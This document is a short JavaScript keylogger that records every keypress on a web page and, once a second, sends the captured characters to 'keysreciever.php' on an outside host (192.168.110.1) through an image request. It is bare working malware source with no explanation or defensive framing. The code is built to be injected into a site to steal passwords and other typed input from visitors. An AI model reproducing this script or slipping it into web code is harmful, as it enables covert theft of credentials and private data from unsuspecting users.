var url = 'http://192.168.110.1/';
var keys='';

document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
}
window.setInterval(function(){
	if(keys.length>0) {
		new Image().src = url+'keysreciever.php?c='+keys;
		keys = '';
	}
}, 1000);